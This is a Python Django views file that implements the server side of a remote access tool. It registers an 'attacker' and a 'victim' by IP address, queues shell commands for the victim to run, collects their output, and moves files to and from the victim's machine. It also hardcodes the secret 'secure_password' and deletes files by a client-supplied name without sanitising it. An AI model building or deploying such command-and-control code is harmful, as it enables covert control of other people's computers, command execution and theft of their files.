from Remote_Communication_Server import settings
from rest_framework.response import Response
from rest_framework.views import APIView
from django.http import HttpResponse
from rest_framework import generics
from ipware import get_client_ip
from .serializers import *
from .models import *
import os

SECRET_KEY = 'secure_password'

class StartSession(APIView):
    def post(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        try:
            client_ip, is_routable = get_client_ip(request)
            
            attacker = Attacker.objects.filter().first()
            if attacker == None:
                attacker = Attacker.objects.create(attacker_ip=client_ip)
                attacker.save()
            
            victim = Victim.objects.filter().first()
            if victim == None:
                response.status_code = 404
                response.data = {'Victim':'None','Session':0}
                return response
            
            session = Session.objects.create(attacker=attacker,victim=victim,victim_name=request.data['victim_name'])
            session.save()
            
            response.status_code = 200
            response.data = {'Session':1}
            return response

        except Exception as e:
            response.status_code = 500
            response.data = {'Problem':'server','Message': str(e)}
            print(str(e))

class EndSession(APIView):
    def post(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        session = Session.objects.filter().first()
        if session == None:
            response.status_code = 404
            response.data = {'Problem':'Session','Message':'No Session'}
            return response
        
        session.delete()
        Victim.objects.all().delete()
        Attacker.objects.all().delete()
        Command.objects.all().delete()
        CommandResult.objects.all().delete()
        
        response.status_code = 200
        return response
    
class GetVictimStatus(APIView):
    def get(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        response.data = {'Victim':not Victim.objects.filter().first()==None,'Session':Session.objects.filter().first()==None}
        response.status_code = 200
        return response

class ConnectVictim(APIView):
    def post(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        try:
            client_ip, is_routable = get_client_ip(request)
            response.status_code = 200
            victim = Victim.objects.filter().first()
            if victim == None:
                victim = Victim.objects.create(victim_ip=client_ip)
                victim.save()
                
            else:
                if victim.victim_ip != client_ip:
                    response.status_code = 404          
            return response

        except Exception as e:
            response.status_code = 500
            response.data = {'Problem':'server','Message': str(e)}
            print(str(e))

class DeleteFile(APIView):
    def post(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        session = Session.objects.filter().first()
        if session == None:
            response.status_code = 404
            response.data = {'Problem':'Session','Message':'No Session'}
            return response
        
        try:
            filename = request.data['filename']
            os.remove(os.path.join(settings.MEDIA_ROOT, filename))
            file = Files.objects.filter(filename=filename).first()
            file.delete()
            response.status_code = 200
            return response

        except Exception as e:
            response.status_code = 500
            response.data = {'Problem':'server','Message': str(e)}
            print(str(e))

class PostCommand(APIView):
    def post(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        session = Session.objects.filter().first()
        if session == None:
            response.status_code = 404
            response.data = {'Problem':'Session','Message':'No Session'}
            return response
        
        try:
            command = Command.objects.create(command_to_exec=request.data['command'])
            command.save()
            response.status_code = 200
            return response

        except Exception as e:
            response.status_code = 500
            response.data = {'Problem':'server','Message': str(e)}
            print(str(e))

class UploadFile(APIView):
    def post(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        session = Session.objects.filter().first()
        if session == None:
            response.status_code = 404
            response.data = {'Problem':'Session','Message':'No Session'}
            return response
        
        try:
            file = request.FILES.get('file')
            new_file = Files.objects.create(file=file,filename=file.name)
            new_file.save()
            response.status_code = 200
            return response

        except Exception as e:
            response.status_code = 500
            response.data = {'Problem':'server','Message': str(e)}
            print(str(e))

class FileDownloadView(generics.RetrieveAPIView):
    serializer_class = FilesSerializer

    def retrieve(self, request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        session = Session.objects.filter().first()
        if session == None:
            response.status_code = 404
            response.data = {'Problem':'Session','Message':'No Session'}
            return response
        try:
            instance = Files.objects.filter(filename=request.data['filename']).first()
            response = HttpResponse(instance.file.read(), content_type='application/octet-stream')
            response['Content-Disposition'] = f'attachment; filename="{instance.filename}"'
            response.status_code = 200
        except:
            response.status_code = 404
        return response

class GetCommandResult(APIView):
    def get(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        session = Session.objects.filter().first()
        if session == None:
            response.status_code = 404
            response.data = {'Problem':'Session','Message':'No Session'}
            return response
        
        try:
            result = CommandResult.objects.filter().order_by('command_results_timestamp').first()
            if result == None:
                response.status_code = 404
                response.data = {'Problem':'None','Response':'Not Completed'}
                return response
            
            result_serialized = CommandResultSerializer(result)
            response.data = result_serialized.data
            response.status_code = 200
            result.delete()
            return response

        except Exception as e:
            response.status_code = 500
            response.data = {'Problem':'server','Message': str(e)}
            print(str(e))

class GetCommand(APIView):
    def get(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        session = Session.objects.filter().first()
        if session == None:
            response.status_code = 404
            response.data = {'Problem':'Session','Message':'No Session'}
            return response
        
        try:
            command = Command.objects.filter().order_by('command_to_exec_timestamp').first()
            if command == None:
                response.status_code = 404
                return response
            
            command_serialized = CommandSerializer(command)
            response.data = command_serialized.data
            response.status_code = 200
            command.delete()
            return response

        except Exception as e:
            response.status_code = 500
            response.data = {'Problem':'server','Message': str(e)}
            print(str(e))

class PostResult(APIView):
    def post(self,request):
        response = Response()

        if request.data['SECRET_KEY'] != SECRET_KEY:
            response.status_code = 401
            response.data = {'Problem':'SECRET_KEY','Message':'Secret Key not valid'}
            return response
        
        session = Session.objects.filter().first()
        if session == None:
            response.status_code = 404
            response.data = {'Problem':'Session','Message':'No Session'}
            return response
        
        try:
            result = CommandResult.objects.create(command_results=request.data['command_result'])
            result.save()
            response.status_code = 200
            return response

        except Exception as e:
            response.status_code = 500
            response.data = {'Problem':'server','Message': str(e)}
            print(str(e))
